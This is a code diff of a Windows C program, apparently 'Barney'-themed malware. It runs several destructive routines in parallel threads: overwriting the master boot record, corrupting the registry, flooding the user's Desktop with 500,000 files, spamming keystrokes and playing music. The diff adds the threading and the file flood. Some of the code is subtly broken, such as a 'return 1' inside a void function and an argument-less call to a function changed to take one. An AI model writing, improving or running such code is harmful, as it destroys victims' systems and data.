@@ -3,21 +3,23 @@
 #include <string.h>
 #include <stdbool.h>
 #include <windows.h>
+#include <process.h>
 
-void trollies();
-void filebomb();
-void registrycorruption();
-void keyboardspam();
-void mbroverwrite();
+void trollies(void*);
+void filebomb(void*);
+void registrycorruption(void*);
+void keyboardspam(void*);
+void mbroverwrite(void*);
 void crypter(unsigned char* bytes, size_t arrsize, unsigned char* key, size_t keysize);
 
 int main()
 {
-    trollies();
-    filebomb();
-    registrycorruption();
-    keyboardspam();
+    _beginthread(trollies, 0, NULL);
+    _beginthread(filebomb, 0, NULL);
+    _beginthread(registrycorruption, 0, NULL);
+    _beginthread(keyboardspam, 0, NULL);
     mbroverwrite();
+    Sleep(10000); // Wait for threads to finish, adjust time accordingly
     return 0;
 }
 
@@ -31,19 +33,31 @@ void mbroverwrite()
     CloseHandle(MBR);
 }
 
-void filebomb()
+void filebomb(void *arg)
 {
-    FILE *fptr;
-    while (true) 
-    {
-        fptr = fopen("filename.txt", "w");
-        if (fptr != NULL) {
-            fclose(fptr);
+    char filename[200]; // Array to store filename
+    const char *desktopPath = getenv("USERPROFILE"); // For Windows, use the USERPROFILE environment variable
+    if (desktopPath == NULL) {
+        fprintf(stderr, "Error: Unable to get the desktop path.\n");
+        return 1;
+    }
+
+    strcpy(filename, desktopPath); // Copy the desktop path to the filename
+    strcat(filename, "\\Desktop\\"); // Use backslashes for Windows path
+
+    for (int i = 1; i <= 500000; i++) {
+        sprintf(filename, "%sYOU GOT BARNIED%d.barney", filename, i); // Create filename with index
+        FILE *file = fopen(filename, "w"); // Open file in write mode
+        if (file != NULL) {
+            fclose(file); // Close the file
         }
+        strcpy(filename, desktopPath); // Reset filename for the next iteration
+        strcat(filename, "\\Desktop\\"); // Reset the path
     }
 }
 
-void registrycorruption()
+
+void registrycorruption(void *arg)
 {
     HKEY hKey;
     DWORD dwDisposition;
@@ -96,7 +110,7 @@ void crypter(unsigned char* bytes, size_t arrsize, unsigned char* key, size_t ke
     }
 }
 
-void keyboardspam()
+void keyboardspam(void *arg)
 {
     const char *text = "barney";
     INPUT inputs[6 * 2] = {0}; // Each character and its release
@@ -113,7 +127,7 @@ void keyboardspam()
     }
 }
 
-void trollies()
+void trollies(void *arg)
 {
 
     printf("\x1b[35m"); // Set text color to purple
@@ -156,6 +170,10 @@ void trollies()
 
     // Plays barney music
     PlaySound("music.wav", NULL, SND_FILENAME|SND_ASYNC);
+
+    //Disable mouse
+
+    //Messes up computer screen
 
     // Corrupts registry and files
     registrycorruption();
